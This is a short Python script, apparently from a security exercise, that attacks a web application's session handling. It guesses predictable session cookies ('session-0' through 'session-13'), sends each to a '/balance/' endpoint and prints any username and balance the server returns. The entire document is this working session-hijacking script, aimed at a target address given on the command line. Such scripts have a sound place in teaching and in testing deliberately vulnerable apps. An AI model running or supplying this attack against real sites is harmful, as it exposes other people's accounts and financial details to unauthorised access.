import sys
import requests
import json
from django.contrib.sessions.models import Session



def test_session(address):
    x = requests.get(address)
    for i in range(0, 14):
        session_id = "session-" + str(i)
        response = requests.get(address + "/balance/", headers={'Cookie': f'sessionid={session_id}'})
        try:
            response.raise_for_status()  # Raise an error for non-200 status codes
            response_json = response.json()
            user = response_json.get("username")
            amount = response_json.get("balance")
            if user and amount is not None:
                print(response)
                print(f"Session ID: {session_id}, User: {user}, Balance: {amount}")
            else:
                print(f"Invalid response for session ID: {session_id}")
        except requests.exceptions.HTTPError as errh:
            print(f"HTTP Error: {errh} for session ID: {session_id}")
        except ValueError as verr:
            print(f"ValueError: {verr} for session ID: {session_id}")
        except Exception as e:
            print(f"Error: {e} for session ID: {session_id}")
            print(f"Response text: {response.text}")

def main(argv):
	address = sys.argv[1]
	print(test_session(address))

if __name__ == "__main__": 
	if len(sys.argv) != 2:
		print('usage: python3 %s address' % sys.argv[0])
	else:
		main(sys.argv)

